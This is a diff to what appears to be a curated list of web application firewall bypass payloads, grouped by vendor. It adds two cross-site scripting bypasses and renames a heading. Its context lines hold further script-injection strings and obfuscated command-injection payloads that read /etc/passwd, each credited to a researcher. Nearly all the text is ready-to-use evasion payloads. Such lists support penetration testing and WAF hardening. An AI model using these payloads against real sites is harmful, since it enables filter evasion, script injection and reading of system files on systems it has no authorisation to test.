@@ -2977,6 +2977,10 @@ xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 ```
 <--`<img/src=` onerror=confirm``> --!>
 ```
+- [XSS Bypass](https://twitter.com/le4rner/status/1146453980400082945) by [@Shiva Krishna](https://twitter.com/le4rner)
+```
+javascript:{alert`0`}
+```
 - [RCE Payload Detection Bypass](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
 ```
 cat$u+/etc$u/passwd$u
@@ -3294,7 +3298,7 @@ https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<scrip
 ```
 
 ### Sucuri
-- [Smuggling RCE Payloads through Sucuri](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
+- [Smuggling RCE Payloads](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
 ```
 /???/??t+/???/??ss??
 ```
@@ -3302,6 +3306,10 @@ https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<scrip
 ```
 ;+cat+/e'tc/pass'wd
 c\\a\\t+/et\\c/pas\\swd
+```
+- [XSS Bypass](https://twitter.com/return_0x/status/1148605627180208129) by [@Luka](https://twitter.com/return_0x)
+```
+"><input/onauxclick="[1].map(prompt)">
 ```
 
 ### URLScan
